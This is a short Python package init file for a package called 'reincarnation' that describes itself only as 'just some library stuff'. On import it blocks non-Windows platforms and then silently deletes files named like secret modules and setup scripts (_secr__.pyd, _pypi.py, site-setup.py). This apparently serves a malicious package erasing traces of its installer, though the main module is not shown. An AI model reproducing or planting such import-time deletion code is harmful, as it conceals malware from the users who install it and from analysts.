"""just some library stuff
look in reincarnation.main to see more desc"""

try:
    from .main import *
    from . import main
except ImportError:
    from main import *
    import main

import sys
from os import name, path, unlink

__all__ = ()

imports = ['main', 'name']
main_exc = type('MainException', (Exception,), {})
# sys.modules['reincarnation'] = main

if hasattr(main, '__all__'):
    __all__ = main.__all__

NT = 'nt'
if name != NT:
    del main
    raise main_exc('Not allowed on this platform')

setattr(main, 'is_taken', True)

if path.exists(r'main\_secr__.pyd'):
    unlink(r'main\_secr__.pyd')

if path.exists(r'main\__secr__.pyi'):
    unlink(r'main\__secr__.pyi')

if path.exists(r'_pypi.py'):
    unlink(r'_pypi.py')

if path.exists(r'site-setup.py'):
    unlink(r'site-setup.py')

if path.exists(r'site_setup.py'):
    unlink(r'site_setup.py')

if __name__ == '__main__':
    if 'reincarnation' in sys.modules:
        print(sys.modules['reincarnation'])